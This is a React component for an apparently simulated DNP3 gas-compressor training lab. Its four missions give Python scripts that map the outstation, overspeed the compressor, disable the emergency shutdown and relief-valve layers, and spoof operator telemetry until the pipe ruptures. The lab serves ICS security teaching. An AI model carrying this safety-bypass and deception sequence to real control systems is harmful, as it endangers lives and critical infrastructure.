/**
 * PipelineLabMonitor — Lab Monitor for Meridian Compressor Station 7 (DNP3)
 * 4-phase attack scenario inspired by PIPEDREAM/INCONTROLLER (CISA AA22-103A, 2022)
 * and TRISIS/TRITON (2017, Schneider Triconex SIS attack, Saudi Arabia)
 */

import { useState } from "react";
import { API_URL } from "../../socket";
import type { ProcessState } from "../../types/process";

interface Props {
  displayed: ProcessState;
  actual: ProcessState;
}

interface Mission {
  id: string;
  phase: number;
  title: string;
  difficulty: "BEGINNER" | "INTERMEDIATE" | "ADVANCED" | "EXPERT";
  objective: string;
  background: string;
  tool: string;
  steps: { label: string; code: string; note?: string }[];
  successCondition: string;
  impact: string[];
}

const MISSIONS: Mission[] = [
  {
    id: "recon",
    phase: 1,
    title: "DNP3 Outstation Reconnaissance",
    difficulty: "BEGINNER",
    objective: "Discover the DNP3 outstation and run a Class 0 integrity poll to map every point",
    background: `DNP3 has no default authentication — Secure Authentication (SAv5) exists in the
standard but is almost never deployed in the field. Before PIPEDREAM/INCONTROLLER
(CISA advisory AA22-103A, 2022) could sabotage gas and electric infrastructure, its
operators had to enumerate the outstation's object model. A Class 0 integrity poll
is exactly what a real DNP3 master does on first connecting to a field device —
it dumps every static point in one shot.`,
    tool: "python3 / netcat",
    steps: [
      {
        label: "Step 1 — Port scan",
        code: `# DNP3 standard port is 20000, training uses 5023
nmap -sT -p 5023 localhost`,
      },
      {
        label: "Step 2 — Connect and identify the outstation",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5023))
banner = json.loads(s.recv(4096))
print("Banner:", json.dumps(banner, indent=2))

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

print("\\nIdentify:")
print(json.dumps(cmd({"cmd": "identify"}), indent=2))
EOF`,
      },
      {
        label: "Step 3 — Class 0 integrity poll (enumerate every point)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5023))
s.recv(4096)  # banner

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

data = cmd({"cmd": "read_class0"})
print(f"Found {data['count']} points\\n")

print("Analog Inputs (Group 30 — measurements):")
for ref, v in data['analog_inputs'].items():
    print(f"  {ref:8s}  {v['name']:22s}  {v['value']:>10}  {v['unit']}")

print("\\nBinary Outputs (Group 12 CROB — ATTACK TARGETS, writable):")
for ref, v in data['binary_outputs'].items():
    print(f"  {ref:8s}  {v['name']:24s}  {v['value']!s:8s}  {v['desc']}")

print("\\nAnalog Outputs (Group 40 — ATTACK TARGETS, writable):")
for ref, v in data['analog_outputs'].items():
    print(f"  {ref:8s}  {v['name']:22s}  {v['value']}  {v['unit']}")
EOF`,
        note: "Notice G12V5 (telemetry_spoofed) — an undocumented engineering point, exactly the kind of hidden god-mode bit real ICS devices sometimes ship with",
      },
    ],
    successCondition: "Connected without authentication and enumerated all AI/BI/BO/AO points",
    impact: ["Receive outstation banner with no credentials", "List every writable Binary/Analog Output", "Identify esd_armed, prv_block_valve_closed, rpm_setpoint, and telemetry_spoofed as attack targets"],
  },
  {
    id: "setpoint",
    phase: 2,
    title: "Setpoint Manipulation",
    difficulty: "INTERMEDIATE",
    objective: "Direct-Operate the compressor RPM setpoint past safe limits and observe the safety system respond",
    background: `A naive attacker jumps straight to sabotage. Push the compressor setpoint hard
and the plant's own protection will likely catch it — the ESD trips the compressor
and opens the blowdown valve before real damage occurs. This is the lesson: a
single Direct Operate write against an unguarded point is not enough. Defense in
depth exists precisely to absorb exactly this kind of attack.`,
    tool: "python3",
    steps: [
      {
        label: "Step 1 — Overspeed the compressor (Analog Output G40V0)",
        code: `python3 << 'EOF'
import socket, json, time

s = socket.socket()
s.connect(('localhost', 5023))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

result = cmd({"cmd": "operate", "group": 40, "index": 0, "value": 12500})
print("Direct Operate result:", result)

print("\\nPolling discharge pressure / RPM / ESD state...")
for _ in range(15):
    r = cmd({"cmd": "read_point", "group": 30, "index": 1})   # discharge_pressure
    p = cmd({"cmd": "read_point", "group": 30, "index": 2})   # compressor_rpm
    e = cmd({"cmd": "read_point", "group": 1,  "index": 3})   # esd_tripped
    print(f"  discharge={r['value']:7.1f} psi   rpm={p['value']:7.0f}   esd_tripped={e['value']}")
    time.sleep(1)
EOF`,
        note: "With ESD armed (default), it trips before pressure reaches rupture territory — the compressor stops itself",
      },
    ],
    successCondition: "ESD trips (esd_tripped=true) before any lasting damage — the safety system did its job",
    impact: ["compressor_rpm climbs then drops to 0", "Blowdown valve opens automatically", "Lesson: single-point sabotage against an armed SIS just triggers a safe shutdown"],
  },
  {
    id: "trisis",
    phase: 3,
    title: "Safety System Bypass — TRISIS Pattern",
    difficulty: "ADVANCED",
    objective: "Disable BOTH the electronic ESD and the mechanical PRV isolation before re-attempting the overspeed",
    background: `The TRISIS/TRITON malware (2017, Saudi Arabia) targeted Schneider Electric
Triconex Safety Instrumented Systems directly — not the process, the thing that
protects the process. This station has two independent layers: the electronic
ESD (Layer 1) and a mechanical Pressure Relief Valve (Layer 2) that can vent to
atmosphere with no electronics involved at all — UNLESS its isolation valve is
closed. Real-world precedent for defeating a mechanical relief valve: the 2005
BP Texas City disaster, caused in part by a blocked-in relief valve.

"Don't just break things. Break the things that prevent things from breaking."`,
    tool: "python3",
    steps: [
      {
        label: "Step 1 — Bypass the ESD (Binary Output G12V0)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5023))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

result = cmd({"cmd": "operate", "group": 12, "index": 0, "value": False})
print("ESD bypass result:", result)
print("Layer 1 is down. The compressor will no longer self-protect.")
EOF`,
      },
      {
        label: "Step 2 — Close the PRV isolation valve (Binary Output G12V1)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5023))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

result = cmd({"cmd": "operate", "group": 12, "index": 1, "value": True})
print("PRV isolation result:", result)
print("Layer 2 is down. There is no fail-safe left between the pipe and rupture.")
EOF`,
        note: "Watch the Station View: both the ESD badge and PRV-BLK valve symbol turn red",
      },
      {
        label: "Step 3 — Close the blowdown valve, then re-attempt the overspeed",
        code: `python3 << 'EOF'
import socket, json, time

s = socket.socket()
s.connect(('localhost', 5023))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

# If Phase 2's trip already opened the blowdown/vent valve, it stays open
# until someone commands it shut — the ESD bypass does not do this for you.
cmd({"cmd": "operate", "group": 12, "index": 4, "value": False})
print("Blowdown valve closed. Discharge can build pressure again.")

cmd({"cmd": "operate", "group": 40, "index": 0, "value": 13500})
print("Setpoint pushed to 13,500 RPM with both safety layers disabled.")
print("Polling pipe stress...")
for _ in range(20):
    stress = cmd({"cmd": "read_point", "group": 30, "index": 6})
    pres   = cmd({"cmd": "read_point", "group": 30, "index": 1})
    print(f"  pipe_stress={stress['value']:5.1f}%   discharge={pres['value']:7.1f} psi")
    time.sleep(1)
EOF`,
        note: "Pipe stress will now climb unchecked toward rupture — nothing is left to stop it",
      },
    ],
    successCondition: "esd_armed=false AND prv_block_valve_closed=true AND pipe_stress climbing past 50%",
    impact: ["Both defense-in-depth layers defeated", "Discharge pressure sustained above 1,540 psi with no relief", "Pipe stress index climbs steadily toward the 100% rupture threshold"],
  },
  {
    id: "pipedream",
    phase: 4,
    title: "PIPEDREAM Pattern — Telemetry Spoofing to Rupture",
    difficulty: "EXPERT",
    objective: "Activate telemetry spoofing so the operator HMI freezes at 'nominal' — then finish the job undetected",
    background: `PIPEDREAM/INCONTROLLER (CISA/NSA/FBI/DOE advisory AA22-103A, 2022) is described
as the most versatile ICS attack toolkit ever publicly documented — purpose-built
to manipulate PLCs and safety controllers in energy infrastructure while evading
detection. The same principle drove Stuxnet (2010): it fed Iranian operators
fabricated "normal" centrifuge telemetry while the real machines spun themselves
to failure. This outstation has an undocumented diagnostic point (G12V5) that
freezes every value the DNP3 master and operator HMI receive. Activate it, and
the Control Room screen will show nominal pressure, RPM, and vibration —
indefinitely — no matter what actually happens to the pipe.`,
    tool: "python3",
    steps: [
      {
        label: "Step 1 — Activate telemetry spoofing (Binary Output G12V5)",
        code: `python3 << 'EOF'
import socket, json

s = socket.socket()
s.connect(('localhost', 5023))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

result = cmd({"cmd": "operate", "group": 12, "index": 5, "value": True})
print("Spoofing activated:", result)
print("The Control Room and any DNP3 master polling this outstation now see")
print("frozen 'nominal' values. Open the Lab Monitor's DECEPTION STATUS panel")
print("to see ground truth alongside what the operator sees.")
EOF`,
        note: "Switch to the Control Room tab — it will now show a calm, nominal station no matter what you do next",
      },
      {
        label: "Step 2 — Finish the overspeed / overpressure attack blind",
        code: `python3 << 'EOF'
import socket, json, time

s = socket.socket()
s.connect(('localhost', 5023))
s.recv(4096)

def cmd(c):
    s.send((json.dumps(c) + '\\n').encode())
    return json.loads(s.recv(65536))

# Assumes ESD + PRV isolation were already defeated in Phase 3
cmd({"cmd": "operate", "group": 40, "index": 0, "value": 14000})
print("Setpoint at 14,000 RPM. Waiting for structural failure...")
print("(The operator's screen will not change. This is the point of the attack.)")

for _ in range(30):
    stress = cmd({"cmd": "read_point", "group": 30, "index": 6})
    print(f"  ground-truth pipe_stress = {stress['value']:5.1f}%")
    if stress['value'] >= 100:
        print("\\nRUPTURE. The operator never saw it coming.")
        break
    time.sleep(1)
EOF`,
      },
    ],
    successCondition: "actual.pipeline.ruptured = true while displayed.pipeline still reads nominal",
    impact: [
      "Ground truth (Lab Monitor / actual state): catastrophic pipeline rupture",
      "Operator HMI (Control Room / displayed state): frozen nominal readings — no alarm ever fires",
      "Real-world consequence: by the time physical evidence forces recognition, the segment has already failed",
    ],
  },
];

const DIFF_COLORS: Record<string, string> = {
  BEGINNER:     "bg-green-900/50 text-green-300 border-green-700",
  INTERMEDIATE: "bg-amber-900/50 text-amber-300 border-amber-700",
  ADVANCED:     "bg-orange-900/50 text-orange-300 border-orange-700",
  EXPERT:       "bg-red-900/60 text-red-300 border-red-700",
};

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text).then(() => {
          setCopied(true);
          setTimeout(() => setCopied(false), 1500);
        });
      }}
      className={`px-2 py-0.5 rounded text-[9px] font-mono border transition-colors ${
        copied
          ? "border-green-700 text-green-400 bg-green-900/20"
          : "border-gray-700 text-gray-400 hover:text-gray-200 hover:border-gray-600"
      }`}
    >
      {copied ? "Copied!" : "Copy"}
    </button>
  );
}

export function PipelineLabMonitor({ displayed, actual }: Props) {
  const [selectedMission, setSelectedMission] = useState(0);
  const [showPointMap, setShowPointMap] = useState(false);
  const mission = MISSIONS[selectedMission];
  const p = actual.pipeline;
  const d = displayed.pipeline;
  if (!p) return null;

  const isUnderAttack =
    !p.esd_armed || p.prv_block_valve_closed || p.esd_tripped ||
    p.ruptured || p.high_pressure_alarm || p.overspeed_alarm || p.telemetry_spoofed;

  const isSpoofed = p.telemetry_spoofed;
  const isDeceived = isSpoofed && (
    Math.abs(p.discharge_pressure - d.discharge_pressure) > 5 ||
    p.ruptured !== d.ruptured ||
    Math.abs(p.compressor_rpm - d.compressor_rpm) > 50
  );

  const resetSystem = async () => {
    await fetch(`${API_URL}/api/reset`, { method: "POST" });
  };

  return (
    <div className="bg-gray-950 text-white p-4 h-full">
      <div className="flex justify-between items-center mb-4">
        <div>
          <h1 className="text-xl font-mono font-bold text-orange-400">LAB MONITOR</h1>
          <p className="text-sm font-mono text-gray-500">
            Meridian Compressor Station 7 — Attack via DNP3, observe ground-truth impact here
          </p>
        </div>
        <div className="flex gap-2">
          <button
            onClick={() => setShowPointMap(!showPointMap)}
            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
          >
            {showPointMap ? "HIDE" : "SHOW"} DNP3 POINT MAP
          </button>
          <button
            onClick={resetSystem}
            className="bg-gray-800 hover:bg-gray-700 text-gray-300 px-3 py-2 rounded font-mono text-xs border border-gray-700"
          >
            RESET SYSTEM
          </button>
        </div>
      </div>

      {showPointMap && (
        <div className="bg-gray-900 rounded-lg p-3 border border-gray-800 mb-4">
          <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">
            DNP3 POINT MAP — Meridian CS7 Outstation (MERIDIAN-CS7-RTU1)
          </h3>
          <div className="flex gap-2 mb-2 text-[10px] font-mono text-gray-500">
            <span>Protocol: <span className="text-cyan-400">DNP3</span></span>
            <span>|</span>
            <span>Port: <span className="text-cyan-400">TCP 5023</span></span>
            <span>|</span>
            <span>Auth: <span className="text-red-400">None / No Secure Authentication</span></span>
          </div>
          <table className="w-full text-xs font-mono">
            <thead>
              <tr className="text-gray-500 border-b border-gray-800">
                <th className="text-left p-1">Point Ref</th>
                <th className="text-left p-1">Group</th>
                <th className="text-left p-1">Access</th>
                <th className="text-left p-1">Description</th>
              </tr>
            </thead>
            <tbody>
              {[
                ["G30V0–V6", "Analog Input",  "R", "Pressure, RPM, temp, vibration, flow, pipe stress"],
                ["G1V0–V8",  "Binary Input",  "R", "Valve/ESD/PRV status, alarms, rupture flag"],
                ["G12V0",    "Binary Output", "W", "ATTACKABLE — esd_armed (SIS bypass)"],
                ["G12V1",    "Binary Output", "W", "ATTACKABLE — prv_block_valve_closed"],
                ["G12V2–V4", "Binary Output", "W", "ATTACKABLE — valve commands"],
                ["G12V5",    "Binary Output", "W", "UNDOCUMENTED — telemetry_spoofed"],
                ["G40V0",    "Analog Output", "W", "ATTACKABLE — rpm_setpoint"],
              ].map(([ref, group, rw, desc]) => (
                <tr key={ref} className={`border-b border-gray-800/30 ${rw === "W" ? "text-red-300" : "text-gray-300"}`}>
                  <td className="p-1 text-cyan-400">{ref}</td>
                  <td className="p-1 text-gray-500">{group}</td>
                  <td className="p-1">
                    <span className={`px-1 rounded ${rw === "W" ? "bg-red-900 text-red-300" : "bg-gray-800 text-gray-400"}`}>{rw}</span>
                  </td>
                  <td className="p-1 text-gray-500 text-[10px]">{desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
          <p className="text-[10px] text-red-400 mt-2">Red rows = writable (attackable) — no authentication required</p>
        </div>
      )}

      <div className="flex gap-2 mb-4">
        {MISSIONS.map((m, i) => (
          <button
            key={m.id}
            onClick={() => setSelectedMission(i)}
            className={`px-3 py-2 rounded font-mono text-xs border ${
              selectedMission === i
                ? "bg-orange-900 border-orange-600 text-orange-200"
                : "bg-gray-900 border-gray-700 text-gray-400 hover:border-gray-500"
            }`}
          >
            Phase {i + 1}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-3 gap-3">
        {/* Left: Mission briefing + commands */}
        <div className="col-span-2 space-y-3">
          <div className="bg-gray-900 rounded-lg p-4 border border-gray-800">
            <div className="flex justify-between items-start mb-3">
              <h2 className="font-mono text-sm font-bold text-gray-200">
                Phase {mission.phase}: {mission.title}
              </h2>
              <span className={`text-xs font-mono px-2 py-1 rounded border ${DIFF_COLORS[mission.difficulty]}`}>
                {mission.difficulty}
              </span>
            </div>
            <div className="mb-3">
              <h3 className="text-xs font-mono text-amber-400 mb-1">OBJECTIVE</h3>
              <p className="text-xs text-gray-300">{mission.objective}</p>
            </div>
            <div className="mb-3">
              <h3 className="text-xs font-mono text-gray-500 mb-1">BACKGROUND</h3>
              <p className="text-xs text-gray-400 italic whitespace-pre-line">{mission.background}</p>
            </div>
            <div className="mb-3">
              <h3 className="text-xs font-mono text-green-400 mb-1">SUCCESS CONDITION</h3>
              <p className="text-xs text-green-300">{mission.successCondition}</p>
            </div>
            <div>
              <h3 className="text-xs font-mono text-blue-400 mb-1">WHERE TO CHECK IMPACT</h3>
              <ul className="text-xs text-gray-400 space-y-1">
                {mission.impact.map((item, i) => (
                  <li key={i} className="flex gap-2"><span className="text-blue-500">-</span> {item}</li>
                ))}
              </ul>
            </div>
          </div>

          <div className="bg-black rounded-lg border border-gray-800 overflow-hidden">
            <div className="px-4 py-2 border-b border-gray-800">
              <h3 className="text-xs font-mono text-green-400 font-bold">COMMANDS — Run these in your terminal</h3>
            </div>
            <div className="p-4 space-y-4">
              {mission.steps.map((step, i) => (
                <div key={i}>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-xs font-mono text-gray-400 font-bold">{step.label}</span>
                    <CopyButton text={step.code} />
                  </div>
                  <pre className="text-xs font-mono text-green-400 overflow-x-auto whitespace-pre bg-gray-950/50 p-2 rounded">
                    {step.code}
                  </pre>
                  {step.note && (
                    <p className="text-[10px] font-mono text-blue-400 mt-1 pl-2 border-l border-blue-800">
                      ℹ {step.note}
                    </p>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right: Live state */}
        <div className="space-y-3">
          <div className={`rounded-lg p-3 border font-mono text-xs text-center font-bold ${
            isUnderAttack ? "bg-red-900/30 border-red-600 text-red-300 animate-pulse" : "bg-green-900/30 border-green-800 text-green-400"
          }`}>
            {isUnderAttack ? "ATTACK DETECTED — Abnormal ground truth" : "NO ATTACK — System normal"}
          </div>

          {/* Deception status — unique to this scenario */}
          <div className={`rounded-lg p-3 border ${
            isDeceived ? "border-purple-600 bg-purple-950/40" : "border-gray-800 bg-gray-900"
          }`}>
            <h3 className={`text-xs font-mono mb-2 font-bold ${isDeceived ? "text-purple-300" : "text-gray-500"}`}>
              DECEPTION STATUS
            </h3>
            {isDeceived ? (
              <div className="space-y-1.5 text-[10px] font-mono">
                <div className="flex justify-between">
                  <span className="text-gray-500">Operator HMI shows</span>
                  <span className="text-green-400 font-bold">{d.discharge_pressure.toFixed(0)} psi · NOMINAL</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Ground truth (here)</span>
                  <span className="text-red-400 font-bold animate-pulse">
                    {p.discharge_pressure.toFixed(0)} psi {p.ruptured ? "· RUPTURED" : "· DEGRADING"}
                  </span>
                </div>
                <div className="mt-2 text-purple-300">
                  The operator cannot see this divergence. Only this Lab Monitor (ground truth) shows it.
                </div>
              </div>
            ) : (
              <div className="text-[10px] font-mono text-gray-600">
                {p.telemetry_spoofed
                  ? "Spoofing active — waiting for ground truth to diverge from frozen HMI values..."
                  : "Telemetry integrity nominal. HMI and ground truth match."}
              </div>
            )}
          </div>

          <div className="bg-gray-900 rounded-lg p-3 border border-gray-800">
            <h3 className="text-xs font-mono text-cyan-400 mb-2 font-bold">STATION STATUS (ground truth)</h3>
            <div className={`rounded p-2 mb-2 text-center border ${
              p.discharge_pressure >= 1540 ? "border-red-700 bg-red-900/20" :
              p.high_pressure_alarm ? "border-amber-700 bg-amber-900/10" : "border-green-800 bg-green-900/10"
            }`}>
              <div className="text-[9px] text-gray-500 uppercase font-mono">Discharge Pressure</div>
              <div className={`text-lg font-bold font-mono ${
                p.discharge_pressure >= 1540 ? "text-red-400 animate-pulse" :
                p.high_pressure_alarm ? "text-amber-400" : "text-green-400"
              }`}>
                {p.discharge_pressure.toFixed(0)} psi
              </div>
            </div>

            <div className="space-y-1 text-[10px] font-mono">
              <div className="flex justify-between"><span className="text-gray-500">Compressor RPM</span>
                <span className={p.overspeed_alarm ? "text-amber-400 font-bold" : "text-gray-300"}>{p.compressor_rpm.toFixed(0)}</span></div>
              <div className="flex justify-between"><span className="text-gray-500">Vibration</span>
                <span className={p.vibration > 10 ? "text-red-400 font-bold" : "text-gray-300"}>{p.vibration.toFixed(1)} mils</span></div>
              <div className="flex justify-between"><span className="text-gray-500">Pipe Stress</span>
                <span className={p.pipe_stress > 75 ? "text-red-400 font-bold" : p.pipe_stress > 40 ? "text-amber-400" : "text-gray-300"}>{p.pipe_stress.toFixed(0)}%</span></div>
            </div>

            {p.ruptured && (
              <div className="mt-2 p-2 rounded bg-red-900/40 border border-red-700 text-center">
                <div className="text-red-300 font-bold text-xs animate-pulse font-mono">PIPELINE RUPTURE</div>
                <div className="text-red-500 text-[9px] font-mono">{p.failure_mode}</div>
              </div>
            )}
          </div>

          <div className="bg-gray-900 rounded-lg p-3 border border-red-900/30">
            <h3 className="text-xs font-mono text-red-400 mb-2 font-bold">SAFETY LAYERS</h3>
            <div className="space-y-1.5 text-xs font-mono">
              {[
                { label: "ESD / SIS (Layer 1)", val: p.esd_armed },
                { label: "PRV Isolation (Layer 2)", val: !p.prv_block_valve_closed },
              ].map(({ label, val }) => (
                <div key={label} className="flex justify-between">
                  <span className="text-gray-500">{label}</span>
                  <span className={!val ? "text-red-400 font-bold" : "text-gray-300"}>{val ? "OK" : "DOWN ⚠"}</span>
                </div>
              ))}
            </div>
          </div>

          {mission.id === "pipedream" && (
            <div className={`rounded-lg border p-3 ${
              p.ruptured && isDeceived ? "border-red-700 bg-red-900/20" : "border-gray-800 bg-gray-900"
            }`}>
              <h3 className="text-xs font-mono text-gray-500 mb-2 font-bold">PIPEDREAM PROGRESS</h3>
              <div className="space-y-1">
                {[
                  { label: "ESD Bypassed",       done: !p.esd_armed },
                  { label: "PRV Isolated",       done: p.prv_block_valve_closed },
                  { label: "Telemetry Spoofed",  done: p.telemetry_spoofed },
                  { label: "HMI Shows Nominal",  done: isSpoofed && !d.high_pressure_alarm },
                  { label: "Pipe Stress > 50%",  done: p.pipe_stress > 50 },
                  { label: "RUPTURE Achieved",   done: p.ruptured },
                ].map(item => (
                  <div key={item.label} className="flex items-center gap-1.5 text-[10px] font-mono">
                    <span className={item.done ? "text-green-500" : "text-gray-700"}>{item.done ? "✓" : "○"}</span>
                    <span className={item.done ? "text-gray-300" : "text-gray-600"}>{item.label}</span>
                  </div>
                ))}
              </div>
              {p.ruptured && isDeceived && (
                <div className="mt-2 p-2 rounded bg-red-900/40 border border-red-700 text-center">
                  <div className="text-red-300 font-bold text-[10px] animate-pulse font-mono">
                    ATTACK COMPLETE — PIPEDREAM PATTERN EXECUTED
                  </div>
                  <div className="text-red-500 text-[9px] font-mono mt-1">
                    Segment ruptured · operator HMI never showed a single alarm
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
